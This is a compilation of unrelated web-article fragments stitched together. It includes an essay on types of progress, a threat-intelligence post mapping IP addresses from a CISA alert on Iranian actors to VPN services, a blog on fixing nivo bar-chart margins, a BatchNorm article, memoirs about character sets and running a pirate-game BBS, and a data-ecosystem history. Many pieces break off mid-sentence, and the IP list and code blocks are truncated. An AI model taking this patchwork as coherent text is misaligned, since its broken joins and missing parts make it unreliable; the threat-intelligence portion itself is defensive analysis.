<p>Individuals should decide whether to focus on the type of progress that fascinates them the most because debating the abstract relative merits of Type I and Type II progress is a waste of time.</p>

<h3 id="arguments-for-the-importance-of-both-type-i-and-type-ii-progress">Arguments for the Importance of Both Type I and Type II Progress</h3>
<p>There are good arguments for focusing on both types of progress. I would categorize the arguments into categories - eliminating bad things and enabling great things.</p>

<h4 id="arguments-for-focusing-on-type-i-progress">Arguments for focusing on Type I progress</h4>
<p>The arguments for focusing on Type I progress are 20% eliminating bad things and 80% enabling great things.</p>

<p>Most of the reasons that Type I progress enables great things are self evident - Type I progress is what turns science fiction into reality.</p>

<p>However, even if you reject “more cool sci-fi stuff” as an intrinsic argument, Tyler Cowen argues in <a href="https://www.amazon.com/Stubborn-Attachments-Prosperous-Responsible-Individuals/dp/1732265135">Stubborn Attachments</a> that long term growth is a moral imperative. In the long run, Type II progress cannot exist without Type I progress. In fact, the rate of Type II progress may be proportional to the distance to the frontier (but this needs evidence.) In a few cases, Type I Progress can enable Type II progress. Normally though, attempts to use cutting edge knowledge to help people in Type II situations ends with broken <a href="https://www.kickstarter.com/projects/unchartedplay/soccket-the-energy-harnessing-soccer-ball">energy-balls</a> and <a href="https://blogs.ei.columbia.edu/2010/07/01/the-playpump-what-went-wrong/">PlayPumps</a> because there is no infrastructure or knowledge to maintain them. So sadly those are exceptions to the rule, and “Type I progress can enable Type II progress” that is not actually a strong argument.</p>

<h4 id="arguments-for-focusing-on-type-ii-progress">Arguments for focusing on Type II progress</h4>
<p>The arguments for focusing on Type II progress are 80% eliminating bad things and 20% enabling great things.</p>

<p>In the eliminating-bad-things category, Type II progress dominates. Type II progress is a clear way to relieve human suffering in the short term which makes a strong moral argument for Type II focus.</p>

<p>The arguments for Type II progress in the enabling great things category are more subtle. Over a long enough timescale, if you focus on Type II progress, you will have more frontier-dwellers simply because Type II progress pushes people up to the frontier. Since you can only push the frontier on dimensions where you are at the frontier, more people pushing the frontier will lead to more frontier expansion.</p>

<p><em>“Okay, but I have &lt;$1B/ 24 hours in a day/ a government organization at my disposal&gt; - should I focus on Type I or Type II progress?”</em></p>

<p>The unsatisfying answer is always going to be: it depends. Remember that because progress frontiers are geographically fractal the answer depends on time and geographic scale.  What are you compelled by as an individual or have a mandate to worry about as an organization? Which contexts provide the most leverage to different types …</p></article></div>

<p>TL;DR APTs use commercial VPNs and proxies. Knowing which service matters.</p>
<p>Several weeks ago DHS/CISA <a href="https://us-cert.cisa.gov/ncas/alerts/aa20-304a" target="_blank" rel="noopener noreferrer">issued an alert</a> that Iranian actors were targeting US election websites. The actors scraped voter registration data, scanned for vulnerabilities, sent voter intimidation emails, and threw exploits.</p>
<p>The report makes a note that this actor uses VPN services for anonymity. Unfortunately, that isn't very specific. We (Spur) provide data to show <em>what</em> VPN services are being used. Threat actors, like everyone, have preferred tools, tactics, and techniques. Knowing these tactics makes for more effective defensive strategies.</p>
<p>I am going to walk through the list of IPs mentioned in the alert as Spur sees them with our data. Spoiler Alert: It's primarily <a href="https://privateinternetaccess.com/" target="_blank" rel="noopener noreferrer">Private Internet Access</a> and <a href="https://nordvpn.com/" target="_blank" rel="noopener noreferrer">Nord VPN</a>, but there are outliers.</p>
<h2 id="analysis">Analysis</h2>
<p>Here is the full list of alert IP addresses we will look at:</p>
<pre><code>102.129.239.185

195.181.170.244
198.147.23.147
198.16.66.139

<p>First, I used the Spur <a href="" target="_blank" rel="noopener noreferrer">Context API</a> to enrich the IP addresses. Here is a sample result:</p>

<p>Above, we can see that <code>185.191.207.52</code> is a Nord VPN exit. It averages 100 active users at any given time. This is busy, even for Nord. <code>185.191.207.52</code> proxies traffic for Luminati and Geosurf. Finally, the geo-precision field indicates heavy usage from Iran.</p>
<h3 id="services-used">Services Used</h3>
<p>A majority of the IPs belong to Nord VPN and PIA. There are two outliers: Browsec VPN and Tor Guard VPN. Is this another actor? Were these used for different activities?</p>

<h3 id="exit-countries">Exit Countries</h3>
<p>The exit locations chosen (server location) are primarily in the US and Europe. It is possible the US was chosen to blend in on traditional server geo application or firewall rules.</p>
<pre><code>  16 US
   5 GB
   4 NL
   4 IL
   2 LU
   2 BE
   1 ZA
   1 IR
   1 FR
   1 DE
   1 CA</code></pre>
<h3 id="usage-density">Usage Density</h3>
<p>Usage density was varied across all of these IPs. Some serve a handful of clients, others are fairly large gateways. This insight can really help narrow down where analysts should focus attention.</p>
<p><img src="https://firebasestorage.googleapis.com/v0/b/spur-us-prod.appspot.com/o/public%2Firanian-apt-nord%2Fip_user_count.png?alt=media" alt=""></p>
<h3 id="the-non-vpn">The Non-VPN</h3>
<p>Spur was not able to identify a VPN operating on <code>5.160.253.50</code>. This IP is especially interesting because it is a proxy in the Geosurf network. There are a few possibilities that could be worth exploring with more data. Is this their first hop IP? Is it possible that Geosuf is the actual common thread between all of these activities? Is this an anonymization or malware network Spur does not track?</p>
<h2 id="further-analysis">Further Analysis</h2>
<p>Some interesting questions could warrant further investigation:</p>
<ol>
<li><p>This actor prefers Nord VPN and PIA. They also used Browsec VPN and Tor Guard VPN. How did activity differ between these?</p>
</li>
<li><p>The IPs have a wide range of activity volume. What threads can we pull from less active gateways?</p>
</li>
<li><p>Are we looking at the wrong thing? There is a high overlap with the Geo Surf residential proxy network. Perhaps this is the actual tradecraft for this actor.</p>
</li>
<li><p>Lots of threat intelligence services have picked up these IP addresses as high risk. Does that actually make sense for a shared commercial VPN?</p>
</li>

data around New York’s 50a police disciplinary record requests.</p><p>My first task was a proof of concept - to put some very basic data in
a bar chart. The data has a single axis: how much each request cost. We
only care about unique costs for the purposes of this visualization, so
the list ended up being only 19 values.</p><pre><code>[

under the hood.</p><p>That’s when things started to get interesting, and by interesting I mean
unexpected, and by unexpected I mean annoying.</p><p>Nivo has lots of documentation, with a really slick display, interactive
widgets and lots of examples on how to solve complex problems. However,
noticeably lacking is much documentation around how to solve simple
problems, like implementing a dead simple bar chart. Equally missing is
a robust getting started document, or a explanation of the architecture
of the library, key concepts, assumptions, and the like.</p><p>Irritating, but fine. I’ve been doing web development long enough not to
be scared away. I dug in, and while it took me longer than I would have
liked to piece together what I actually needed for my little bar chart,
I had a working widget.</p><div><pre><code data-lang="jsx"><span>&lt;</span><span>Bar</span>
  <span>width</span><span>=</span><span>{</span><span>800</span><span>}</span>
  <span>height</span><span>=</span><span>{</span><span>500</span><span>}</span>
  <span>layout</span><span>=</span><span>"horizontal"</span>
  <span>data</span><span>=</span><span>{</span><span>prices</span><span>}</span>
<span>/&gt;</span>
</code></pre></div><p>Well, working was a bit of an overstatement. While it rendered, it
looked, well, <em>off</em>.</p><figure><img src="https://www.chrisdeluca.me/article/rendering-simple-bar-chart-nivo/images/before.png"></figure><p>Was my data wrong? I double and triple checked it, throwing
<code>console.log</code>s all over the place. Everything seemed fine.</p><p>After some careful eyeballing, it seemed like the issue was not that the
data was wrong, but that the display was being cut off.</p><p>I checked the nivo documentation - maybe I missed a vital configuration?
Some CSS file I needed to include? Where’s the option for “render
correctly”?</p><p>Unfortunately all I found was very fancy how-tos on how to render
multi-colored bars with multi-layered data and lots of animations. Cool
stuff, but not helpful here.</p><p>I was starting to get frustrated. How hard could it be to render a dead
simple bar chart?</p><p>I tried extending the <code>width</code> and <code>height</code> attributes on the chart,
but that only made the SVG canvas bigger, leaving in tact the cut-off
values.</p><p>Finally, I broke down and started digging into nivo’s code.</p><h2 id="the-work">The work <a href="#the-work">¶</a></h2><p>While I couldn’t find any documentation on it, maybe there was a CSS
file I needed to include? I poked around in the SVG source that nivo
generates, and noticed that the SVG elements did not include any classes
or ids. That hinted that there was no default CSS file to include, but
to check my assumption, I searched the entire node package for any CSS
file.</p><pre><code>find ./node_modules/@nivo/ -type f -name "*.css"
</code></pre><p>That returned no results, so I could confidently cross off “forgot to
include library CSS file” from my debugging checklist.</p><p>If there was no external CSS library expected, the chart would have to
be styled another way. SVGs have lots of styling effects via the use of
properties; maybe something in there was amiss? Seemed like a stretch
that there was a bug in the library for rendering such a simple graphic,
but I didn’t have any better ideas, so I started combing through the SVG
markup.</p><p>I didn’t notice anything strange about the SVG properties, but I did
notice lots of inline CSS styles. Okay, so that makes sense; the library
needs more styling power than pure SVG, and since it isn’t using an
external CSS source, it’s injecting the styles on each element directly.</p><p>That made me challenge a core assumption I had been making: that the
library was smart enough to fit the data given inside the SVG canvas.
After checking the API documentation again with my new hypothesis
goggles, I found the <code>margin</code> property, with this description:</p><blockquote><p>Chart margin.</p></blockquote><p>Not exactly the clarification I was hoping for, but my new theory was
that since the library only dealt in inline styles (seeing as another
docs search found no method of passing in custom CSS class/id values)
and values being cut off is essentially an offset issue, I figured that
<code>margin</code> sounded close enough to how I hoped the styles could change.</p><p>I slapped that sucker on the component, and sure enough, it fixed the
issue. My assumption was (unfortunately) correct; you have to explicitly
set <code>margin</code>s for your simple bar chart, otherwise nivo might not
display it properly.</p><p>This would have been really helpful to have outlined in a core concept
document, and was rather disheartening, because it meant that component
configuration is tied directly to the shape of the data, adding a
maintenance headache. However, it worked, and that issue was for future
Chris to deal with.</p><p>Unfortunately, I wasn’t completely done. Since my chart was so simple,
containing only one value column, I wanted to simplify the display. By
default, the nivo chart outputs x and y axis labels, as well as a label
overlaying the bar itself. This is great for complex, multi-axis data,
but for a simple chart like this was entirely redundant, and also caused
overlapping values because of the vast differentials between them.</p><figure><img src="https://www.chrisdeluca.me/article/rendering-simple-bar-chart-nivo/images/iteration-1.png"></figure><p>My ideal state was to hide the x and y axis displays, and just use the
label overlaying the bar, since the data isn’t relational. However,
nivo does not present an option for this. It does provide an option for
hiding the overlay labels, so I went with that.</p><p>That fixed the overlapping data issue, yet the y axis was still
redundant and potentially confusing.</p><figure><img src="https://www.chrisdeluca.me/article/rendering-simple-bar-chart-nivo/images/iteration-2.png"></figure><p>Again, nivo offers no way to hide this display, so I turned to the dark
arts: hacky CSS.</p><p>Since nivo doesn’t supply unique identifiers for elements, nor does it
supply a method to pass in your own, I resorted to this monstrosity:</p><div><pre><code data-lang="css"><span>.</span><span>headline__costs</span> <span>+</span> <span>svg</span> <span>&gt;</span> <span>g</span> <span>&gt;</span> <span>g</span><span>:</span><span>nth-child</span><span>(</span><span>2</span><span>)</span> <span>{</span>
  <span>display</span><span>:</span> <span>none</span><span>;</span>
<span>}</span>
</code></pre></div><p>Eagle-eyed CSS-folk will have noticed that this code is brittle as hell;
if the nivo library changes how it outputs it’s SVG markup, say, moving
the y axis to be the first child instead of the second, this code will
hide the wrong element.</p><p>That being said, this works for now, and provides some real value by
making the data visualization more clear.</p><figure><img src="https://www.chrisdeluca.me/article/rendering-simple-bar-chart-nivo/images/final.png"></figure><h2 id="conclusion">Conclusion <a href="#conclusion">¶</a></h2><p>And that’s my journey with nivo so far; an impressive library with lots
slick functionality, but some strange omissions around dynamically
rendering data shapes and a lack of basic documentation.</p><h3 id="in-closing-nivo-does">In closing, nivo <em>does</em>: <a href="#in-closing-nivo-does">¶</a></h3><ul><li>Render SVGs using only inline CSS</li><li>Allow some style tweaks to that inline CSS via component properties</li><li>Allows hiding overlay labels</li></ul><h3 id="nivo-does-not">Nivo <em>does not</em>: <a href="#nivo-does-not">¶</a></h3><ul><li>Automatically render chars so that all given data is visible (offsets must be manually set via the <code>margin</code> property for each dataset)</li><li>Provide getting started documentation aimed at new users</li><li>Provide documentation on core concepts for how the library functions</li><li>Make rendering a simple bar chart simple (oooh, 🌶️!)</li></ul><p>Thanks for reading!</p></div></div>]]>

  </figure></div></div></div><p>BatchNorm<sup id="fnref-1"><a href="#fn-1">1</a></sup> is a technique for normalising the outputs of intermediate layers inside a neural network using the batch's statistics. The method was originally designed to "reduce internal covariate shift" - to force all of the intermediate layers to have zero mean and unit variance so that the outputs do not explode (especially in deep networks) and keep everything nice and centered around zero. And BatchNorm has proved vital to getting networks to train, enabling larger learning rates, faster training and results that generalise better. But since the algorithm's original publishing, much more work has been done identifying why BatchNorm works. And it's not because it reduces covariate shift (mostly), but rather because it has a profound impact on the loss landscape<sup id="fnref-2"><a href="#fn-2">2</a></sup> that the algorithm must traverse in order to find an optimal solution. BatchNorm smooths the loss landscape so that our optimizers can find good solutions much easier. But with this in mind, couldn't we design a better normalisation strategy? One that uses our better understanding of why it works the way it does. Well that's what I hope to explain in this article.</p><h2 id="batchnorm"><a href="#batchnorm" aria-label="batchnorm permalink"></a>BatchNorm</h2><p>As a brief reminder, BatchNorm normalises batches using the mean and variance of the batch during training according to the following formula:</p><p><span><span><span><math><semantics><mrow><mtext>BN</mtext><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mo>=</mo><mi>γ</mi><mfrac><mrow><mi>x</mi><mo>−</mo><mi>μ</mi></mrow><msqrt><mrow><msup><mi>σ</mi><mn>2</mn></msup><mo>+</mo><mi>ϵ</mi></mrow></msqrt></mfrac><mo>+</mo><mi>β</mi></mrow><annotation encoding="application/x-tex">\text{BN}(x) = \gamma\frac{x-\mu}{\sqrt{\sigma^2+\epsilon}}+\beta</annotation></semantics></math></span></span></span></p><h2 id="why-should-we-replace-batchnorm"><a href="#why-should-we-replace-batchnorm" aria-label="why should we replace batchnorm permalink"></a>Why Should we Replace BatchNorm?</h2><p>BatchNorm has proven instrumental to creating and training increasingly deeper networks, providing stability to training and reducing training times. Nevertheless, there are a few drawbacks to the method:</p><ol><li><p>One of the main reasons that researchers look for alternatives to BN is when training a network with a small batch size. Since BatchNorm generates statistics across the batch, if the batch size is small, the standard deviation is likely to be very small for at least one batch of data, leading to numerical instability in the normalisation. But with the increasing model and input sizes used in modern networks, the batch size must be small to fit into memory, leading to a trade off between the size of the architecture and the size of the batch.</p></li><li><p>Additionally, the original premise behind BatchNorm proved to be somewhat incorrect<sup id="fnref-2"><a href="#fn-2">2</a></sup> - but the technique still worked (like a lot of other bugs in ML). With this improved knowledge could it not be possible to further improve the normalisation by redesigning it now. It's a bit like, after learning how an oven works, we create a new cake recipe to use this knowledge.</p></li><li><p>BatchNorm creates trouble for different domains when using transfer learning. When transferring from one domain to another, particularly with little data, the input has a different distribution. As a result, the normalization is particularly skewed and may ruin the training. In particular, this happens when just training the head of the network - a common practice in transfer learning. As a result, we have to train the BatchNorm layers (or make sure that they are in inference mode) in order for the body of the network to produce sensible results to train the head on.</p></li><li><p>BatchNorm has different training and testing phases, making the generalisation slightly more unpredictable. The network can't dynamically adjust to an input that has a completely different distribution than the ones it has previously encountered, which may lead to strange performance<sup id="fnref-4"><a href="#fn-4">4</a></sup>.</p></li></ol><h2 id="setting-the-baseline"><a href="#setting-the-baseline" aria-label="setting the baseline permalink"></a>Setting the Baseline</h2><p>For the most part of this exploration, I will compare two networks: a small 4 layer convolutional network and a ResNet18, both trained on <a href="https://github.com/fastai/imagenette" rel="nofollow noopener noreferrer">Imagenette</a>, and averaged over 3 training runs each.

Well the first possible solution would be to increase the epsilon parameter in the divisor of the normalisation step which is used to prevent numerical instability. If we increase it to 0.1 then the output of the normalisation will be constrained to <span><span><math><semantics><mrow><msqrt><mn>10</mn></msqrt></mrow><annotation encoding="application/x-tex">\sqrt{10}</annotation></semantics></math></span></span> times the input.

Why is this? While the normalisation step is much the same, and thus the forward pass results in the same numbers, the backward pass is very different. Since the running statistics are detached from the batch statistics (there is no connection between them and thus they are treated as constants), the gradient is very different between BatchNorm and RunningBatchNorm. The gradient no longer takes into account the gradient of the batch statistics. And this effect turned out to be more important than normalising the internal layers<sup id="fnref-2"><a href="#fn-2">2</a></sup>.</p><h2 id="comparing-the-gradients"><a href="#comparing-the-gradients" aria-label="comparing the gradients permalink"></a>Comparing the Gradients</h2><p>The original authors of BatchNorm left the "precise effect of Batch Normalization on gradient propagation" as a further area of study. So, after some time, the effect of BN on the loss landscape was studied<sup id="fnref-2"><a href="#fn-2">2</a></sup>. It turns out that the whitening in BatchNorm using the batch statistics smooths the loss landscape. This means the gradients are more predictive - if you take a step in the direction of the current gradient, it is quite likely that you will continue moving in the same direction for the next gradient step. So if you doubled the learning rate, then things are just fine.</p><p>A smooth loss landscape prevents exploding and vanishing gradients and reduces the reliance on a good intialisation and a tuned, small learning rate. And while BatchNorm reparametrizes the loss using the batch statistics, it still keeps the same minima, since the parameters <span><span><math><semantics><mrow><mi>β</mi></mrow><annotation encoding="application/x-tex">\beta</annotation></semantics></math></span></span> and <span><span><math><semantics><mrow><mi>γ</mi></mrow><annotation encoding="application/x-tex">\gamma</annotation></semantics></math></span></span> can always be set to undo the whitening transform.</p><p>We can write out the gradients using backpropagation through a batchnorm layer and compare those with the RunningBN layer to see what changes.</p><div><div><div><figure>

But how does this show up in the gradients empirically, when training a network. Here we plot the L2 norm of the gradients throughout training for all the convolutional layers in the networks without and with BatchNorm and using RunningBatchNorm.</p><p>What we expect to see is how using BatchNorm results in gradients that don't explode or vanish. As we go deeper into the network, if the norm of the gradients keeps increasing or decreasing, then training becomes harder for the network. So ideally, we want to see the norms of the gradients remain roughly constant across iterations and layers. Additionally, we want fairly stable gradients that don't have any large drops or rises. In the non-normalised graph, we can see that there is a steep dropoff at the beginning, followed by a continual rise. The BatchNorm graph is much more stable. Furthermore, the L2 norm of the BN and RunningBN graphs are very similar, however, the L2 norm doesn't quite tell us enough about the <em>quality</em> of the gradients.</p><div><div><div><figure>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>When I was growing up using computers I was clueless about character sets. Mostly there were just US characters, and everyone converted the umlauts (Ä and Ö) and the A with the overring (Å) used in Finnish to their A, O and A equivalents. I guess you could call that transliteration, and we all did it&nbsp;because we had to. Technology evolved and we got more and more Äs, Ös and Ås in our digital lives. Everyone I knew was using Windows. Life was good. Then came the web and trouble started brewing.</p><div><p>I started my webmaster amateur career sometime in 1996. I still didn't know (or care) much about character sets, and the most common mistakes I made while learning was with images;&nbsp;I accidentally referred to them from my local C: drive or they were so large it would take a fortnight to load with my somewhat outdated 9.6k <a href="https://en.wikipedia.org/wiki/Great_Valley_Products" title="">GVC</a> modem.</p><p>It wasn't until my first "real job" in early 2000 when I got a glimpse of&nbsp;the horrors of character sets. At work <a href="https://en.wikipedia.org/wiki/Art_director" title="">Art Directors</a>&nbsp;were using colorful <a href="https://en.wikipedia.org/wiki/Power_Macintosh_G3" title="">Macintosh G3 tower computers</a> with&nbsp;<a href="https://en.wikipedia.org/wiki/Mac_OS_9" title="">Mac OS 9</a> that didn't seem to run straight for more than a day. Even worse, sometimes they couldn't even display contemporary words like <a href="https://urbaanisanakirja.com/word/larvilautanen/" title="">lärvilautanen</a> or names like <a href="https://www.mikrobitti.fi/uutiset/jaakko-rytsola-oli-lamborghininsa-kanssa-it-kuplan-kasvot-menetti-miljoonat-ja-haluaa-nyt-opettaa-rahan-arvon-uudella-sovelluksella/dc23a929-db4d-4302-ab7d-3b5a8127d0ff" title="">Rytsölä</a> right. I&nbsp;snickered and crouched over the keyboard of my rock-solid <a href="https://en.wikipedia.org/wiki/Windows_NT" title="">Windows NT</a> workstation to&nbsp;craft some fine artesan HTML with notepad.exe.</p><p>The early 2000s were an intense learning experience for me. I switched over from <a href="https://en.wikipedia.org/wiki/Microsoft_Notepad" title="">Microsoft Notepad</a> to <a href="https://medium.com/@velmu/is-it-time-to-reconsider-dreamweaver-34d442e5c278" title="">Macromedia DreamWeaver</a> to <a href="https://en.wikipedia.org/wiki/Macromedia_HomeSite" title="">Allaire HomeSite</a>. My career peaked when I worked on&nbsp;<a href="http://web.archive.org/web/20001019003024/http://www.bomfunk.net/main_first.html" title="">the homepage for Bomfunk MCs</a>.&nbsp;I felt invincible. I ran into trouble with characters occasionally, but the "real developers" working with ASP or Java were always willing to help the front end developer greenhorn&nbsp;navigate the seas of broken <a href="https://en.wikipedia.org/wiki/Verdana" title="">Verdana</a> on a manager's&nbsp;screen. Every so often I also had issues with <a href="https://en.wikipedia.org/wiki/Newline" title="">line breaks</a> too, but the bearded guy always helped me out. I think he used <a href="https://en.wikipedia.org/wiki/Solaris_(operating_system)" title="">Solaris</a>.</p><p>I didn't really start my hate-hate relationship with characters until around 2003. At twenty-three I was now a <em>Senior Developer</em>, and had stretched my wings to the server-side as well with mad LAMP&nbsp;skillz and setting up vhosts on Apache. I was, what you would now call&nbsp;a <em>Senior Fullstack Ninja</em>. Or that's how I saw myself. I was&nbsp;the person people came to get advice from, knee-deep in JavaScript, having innovated an <a href="https://janit.iki.fi/pdf/tarvainen_thesis-040428.pdf" title="">amazing client-side bug tracker</a>&nbsp;that would change how we work. Little did I know.</p><p>At this point I was also working on some projects for a well-known (at the time) Finnish mobile phone manufacturer in foreign languages like Hebrew&nbsp;and Hungarian. This is when it all started falling apart. In the past I had been able to solve issues with weird characters by poking them with a stick or the magical&nbsp;<em>charset=iso-8859-1</em>&nbsp;metatag. But things were gradually getting worse. I was increasingly unable to use HomeSite because the characters were garbled. After too many <a href="https://www.youtube.com/watch?v=YYv4yadRexY" title="">Jallu</a> shots, I&nbsp;opened up to a guru about this and he mumbled something about no support for UTF-8.&nbsp;</p><p>Now I was a man on a mission. I would find out all about this UTF-8 and conquer this land of <a href="https://en.wikipedia.org/wiki/Standard_Generalized_Markup_Language" title="">SGML</a>-like markup once again. I armed myself with all the information on the interwebs and even bought a hard copy of the&nbsp;<a href="https://www.oreilly.com/library/view/unicode-explained/059610121X/" title="">O'Reilly mini reference on UTF-8</a>. Then I kind of got it, but things were complicated in the real world. Some things were <a href="https://en.wikipedia.org/wiki/UTF-8" title="">UTF-8</a>, some <a href="https://en.wikipedia.org/wiki/ISO/IEC_8859-1" title="">ISO-8859-1</a> and occasionally there was some random <a href="https://en.wikipedia.org/wiki/Macintosh_Latin_encoding" title="">Macintosh Latin</a> from a unicorn who could do design and HTML. I read deeper and started seeing nightmares about monsters like the the <a href="https://en.wikipedia.org/wiki/Byte_order_mark" title="">Byte Order Mark</a> and&nbsp;<a href="https://en.wikipedia.org/wiki/Endianness" title="">Endianness</a>. Cumulatively I spent weeks on&nbsp;figuring out character sets from files&nbsp;and parsing out something not fÃ©d.</p><p>I was still quite confused&nbsp;with the prospect of <a href="https://en.wikipedia.org/wiki/UTF-16" title="">UTF-16</a> and what it would mean for me. Gladly that seemed to have been a whole lot of nothing, and with a steady&nbsp;diet of Linux, OS X and Windows on the desktop it seemed the worst was over. There were some cases where I needed to figure out strange issues with broken characters (usually because of using <a href="https://janit.iki.fi/shit/PHP-the-good-parts.png" title="">non-multibyte safe functions</a> on the server), but this was much more of my own fault than random wonky encodings from input data.</p><p>Still, there were some systems not using UTF-8 by default.&nbsp;There was little incentive for that as it wasn't like there were new letters being added to the English alphabet&nbsp;or anything. This changed gradually with the mainstream adoption of smartphones and <a href="https://en.wikipedia.org/wiki/Emoji" title="">Emojis</a>. Those cute little&nbsp;🖼️s are essentially new letters to the alphabet. To stay relevant in the age of social media you had to support emoji&nbsp;or you were&nbsp;💀 in the 💧. Fast forward to today and I can't remember the time I wrestled broken characters.</p><p>There are still enterprise&nbsp;systems that can suffer a death by a thousand candy-bar emojis&nbsp;and <a href="https://dev.mysql.com/doc/refman/8.0/en/charset-unicode-utf8mb4.html" title="">UTF-8 quirks in MySQL</a>, but overall I am now in a much happier&nbsp;place. I still don't really know how all this <a href="https://en.wikipedia.org/wiki/Plane_(Unicode)" title="">character set black magic</a>&nbsp;works deep down, but I don't need to know. For most part it's now a non-issue in my life. And it's amusing to see <a href="https://www.engadget.com/2017-10-31-apple-ios-11-1-new-emojis-security-updates.html" title="">Apple using new emojis as a carrot</a> to get people to install the latest security patches. This was a fun nostalgia trip, but I certainly wouldn't want to go back in time to work on multilingual web development. Or implement designs with rounded corners.</p><p>I'd like to extend a&nbsp;big thank you to everyone for using emoji! You saved my&nbsp;🍑!</p><p>Photo by <a href="https://unsplash.com/@christiannkoepke?utm_source=unsplash&amp;utm_medium=referral&amp;utm_content=creditCopyText">Christiann Koepke</a> on <a href="https://unsplash.com/s/photos/peaches-tree?utm_source=unsplash&amp;utm_medium=referral&amp;utm_content=creditCopyText">Unsplash</a></p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article><header><p>November 16, 2020</p></header><p>Today, the data ecosystem is thriving, buzz words are everywhere and new product names pop up every day. It makes it hard for people that step in the field to see the signal in the noise.</p><p>In this article, I try to take a step back and explain what the current ecosystem is made of. <em>Why do we have this multitude of products and where does every part fit in the modern enterprise ?</em> There will be quite some simplification. In reality, every company is different and has different needs.</p><h3>Early 2000s : The rise of the internet and data volumes</h3><p>With the rise of the internet, companies struggled with the growing number of data sources they had to handle. Company data got siloed in different relational databases.
This prevented companies from quickly getting <strong>data analytics</strong> and <strong>actionable insights</strong> about customers, sales…</p><p>Data warehouses provided a solution by bringing together all the siloed relational databases into one single source of truth, used to provide a 360° view of customer data.</p><p><svg xmlns="http://www.w3.org/2000/svg" id="svg917" version="1.1"

    </span><h3>2010 to 2015 : Cloud transition and the shaping of modern data warehouses</h3><p>Nevertheless, during the early 2010’s, the majority of large companies were still hesitating about whether to stay on-premise or move to the cloud, and kept waiting for a major Big Data service provider that made things easier.</p><p>Only early adopter large companies made the move to invest in Big Data technologies. It turned out that it wasn’t a simple technology adoption, but it needed a company wide <strong>data driven culture,</strong> new job titles and a multitude of complex data processes.</p><p>During these years, a pattern change happened for data warehouses.</p><p>Due to data volume increase and data variety, as well as due to the rise of business analytics expectations, companies started experiencing a bottleneck on the staging layer of the data warehouse. It usually took weeks or months to integrate a new data source in the Extract - Transform - Load pattern.</p><p>In addition to structured transactional data, companies started to collect more and more behavioral data with a fast changing schema.</p><p>Finally, there was a realization that storage costs were far more affordable than before. Computation power of the data warehouses also went up. Therefore, it made sense to load the data in the warehouse before transforming it.</p><p>3 shifts started happening :</p><ul><li><strong>From ETL</strong> (Extract-Transform-Load) <strong>to ELT</strong> (Extract-Load-Transform)</li><li><strong>From On premise to the Cloud</strong>  : Cloud service providers could provide easy and elastic data warehouses that fit the company needs.</li><li><strong>from Hadoop to new Data Lakes</strong>: Data Lakes are centralized raw data staging areas, (It could be a simple Amazon S3 repository or Google Cloud Storage, or it could have more capabilities)</li></ul><p>Moreover, the rise of infrastructures that can handle huge amounts of data paved the way to the rise of IoT and connected objects which found a lot of success. This, in turn, increased the amount of data some companies had to handle.</p><h3>2015 - 2017: Data Plumbing and AI Hype</h3><p>The main Big Data infrastructure seams clearer to most companies, the main challenges are now about how to easily and quickly ingest data and how to quickly make it available to analysts and business users.</p><p>Data Engineers are hired to take care of the data plumbing around the modern data warehouse. We see the rise of data flow automation tools like Apache Airflow. These tools enable companies to automate the ingestion and the transformation part of a data pipeline.</p><p>We feel that NoSQL loses some momentum and SQL is officially back with tools that allow SQL queries on unstructured and structured data warehouse data. (Snowflake, BigQuery)</p><p>The “Big data” hype reaches a plateau, not because it’s not relevant anymore, but because it’s now a reality. A new field retains most of the media attention. Artificial intelligence is the new gold. Following some deep learning advancements, Machine learning gains a lot of attraction.</p><p>This, democratizes the <strong>operational use of AI</strong> to explore and offer <strong>data powered products</strong>. (Recommendation systems, Predictive maintenance …) . As a result and thanks to the stabilization of ML methodologies, we saw the birth of DataOps collaborative platforms that enable companies to easily experiment with ML models on business data.</p><blockquote><p>For large organizations: if you’re not actively building a Big Data + AI strategy at this point (either homegrown or by partnering with vendors), you’re exposing yourself to obsolescence. - Matt Turk</p></blockquote><span>

    </span><h3>2018 - 2020: Current challenges</h3><p>From 2018 to 2020:  Most of large companies started or are going through their Cloud transition.</p><p>Engineers kept on working on tools to access and process raw data easier and faster.</p><ul><li>Some tools like (dbt) made it possible to use SQL as the transform layer.</li><li>Stream processing approaches are getting more attraction.</li></ul><p>Here are some of the challenges companies are facing today :</p><ul><li>Hybrid Cloud :
In order to avoid vendor lock-in and optimize costs, many companies are opting for hybrid approaches with a mix of private cloud, public cloud and on-premise.</li><li>Data cataloging and meta data management :
Data and data sources are the base of this whole systems. They need to be properly indexed, enriched and referenced to make it easier for anyone to find them and know how to use them.
In the same vein, we see the need for “feature catalogs” needed in the machine learning pipeline.</li><li>Data quality :
Data quality means ensuring data integrity, consistency, availability and usability at every stage of the data pipeline.</li><li>Security and privacy :
Following the Facebook Cambridge Analytica scandal, privacy issues became more important for companies and for the general public.
New regulations like the GDPR (General Data Protection Regulation) and CCPA (California Consumer Privacy Act) introduced new data tracing and security constraints.
Companies need easy solutions to centralize data access controls. The use of data must be traced and controlled.</li></ul><p>Below, you’ll find a quite complete reference architecture diagram of the modern data infrastructure.

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>In the early 90s I ran a BBS&nbsp;<span>(Bulletin Board System)</span><span>&nbsp;</span><span>on my ridiculously tricked out Amiga
500.&nbsp; It had a 20 MB hard drive the size
of a shoe hanging off the side, an internal CPU expansion board upgrading to a
zippy 68020 clocking 33MHz, and a USRobotics dial up modem at 28800 baud connected
to the serial port at the back. This was, if not quite before the Internet, at
least before the Internet had made it to my teenage bedroom. No WhatsApp, but
you could send messages to other users on the BBS, and even between BBSes if
the sysop had connected to FidoNet. Which I had not because the purpose of the
BBS was not social networking. I am not quite sure when the statute of
limitations expires for copyright violations on distribution of cracked games,
so I will plead the fifth on the name of my BBS. Suffice it to say, compared to
swapping floppy disks over mail, BBSs were considered a technical improvement associated
with social degeneration because it did not require a fingerspitzengefühl for sending
mail in such a way that the stamps could be reused - with a thin layer of glue
or appropriate placement on the envelope to confuse a sleepy post office
employee. I had no interest in playing any of the games passing through my
hands. I was a socially awkward teenager seeking the approval
of a cooler crowd by being the first to supply the latest wares.</span></p><p>In case you are wondering, by the way, running a BBS on a
dial-up modem means that you can only have one user at a time. Each BBS was a phone
number with a dedicated landline, or worse, harassed parents persuaded to
unplug the house phones at 10 PM to run a part-time service until the morning.
But if you dialled and there was another user connected, you got the busy
signal. <o:p></o:p></p><p>There were several choices for the software to operate BBSes
